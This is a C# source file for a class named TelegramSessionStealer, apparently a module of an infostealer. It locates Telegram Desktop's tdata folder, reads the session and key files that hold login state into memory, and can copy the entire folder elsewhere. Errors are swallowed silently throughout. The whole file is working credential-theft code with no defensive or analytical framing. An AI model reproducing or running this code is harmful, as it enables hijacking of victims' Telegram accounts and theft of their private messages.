using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Messaging
{
    public class TelegramSessionStealer
    {
        private static readonly string[] TelegramPaths = new string[]
        {
            "%APPDATA%\\Telegram Desktop\\tdata",
            "%USERPROFILE%\\Downloads\\Telegram Desktop\\tdata"
        };
        
        private static readonly string[] ImportantFiles = new string[]
        {
            "D877F783D5D3EF8C*",
            "map*",
            "key_datas",
            "usertag",
            "settings*"
        };
        
        public static Dictionary<string, byte[]> StealTelegramSession()
        {
            Dictionary<string, byte[]> sessionFiles = new Dictionary<string, byte[]>();
            
            foreach (string path in TelegramPaths)
            {
                try
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (!Directory.Exists(expandedPath))
                        continue;
                    
                    // Copy important session files
                    foreach (string pattern in ImportantFiles)
                    {
                        try
                        {
                            string[] files = Directory.GetFiles(expandedPath, pattern, SearchOption.TopDirectoryOnly);
                            
                            foreach (string file in files)
                            {
                                try
                                {
                                    string fileName = Path.GetFileName(file);
                                    byte[] fileData = File.ReadAllBytes(file);
                                    sessionFiles[$"Telegram_{fileName}"] = fileData;
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                    
                    // Also check for key_data file
                    string keyDataFile = Path.Combine(expandedPath, "key_data");
                    if (File.Exists(keyDataFile))
                    {
                        sessionFiles["Telegram_key_data"] = File.ReadAllBytes(keyDataFile);
                    }
                }
                catch { }
            }
            
            return sessionFiles;
        }
        
        public static bool CopyTelegramFolder(string destinationFolder)
        {
            try
            {
                foreach (string path in TelegramPaths)
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (!Directory.Exists(expandedPath))
                        continue;
                    
                    string destPath = Path.Combine(destinationFolder, "Telegram_tdata");
                    
                    if (!Directory.Exists(destPath))
                        Directory.CreateDirectory(destPath);
                    
                    CopyDirectory(expandedPath, destPath);
                    return true;
                }
            }
            catch { }
            
            return false;
        }
        
        private static void CopyDirectory(string sourceDir, string destDir)
        {
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                try
                {
                    string fileName = Path.GetFileName(file);
                    string destFile = Path.Combine(destDir, fileName);
                    File.Copy(file, destFile, true);
                }
                catch { }
            }
            
            foreach (string dir in Directory.GetDirectories(sourceDir))
            {
                try
                {
                    string dirName = Path.GetFileName(dir);
                    string destSubDir = Path.Combine(destDir, dirName);
                    Directory.CreateDirectory(destSubDir);
                    CopyDirectory(dir, destSubDir);
                }
                catch { }
            }
        }
    }
}
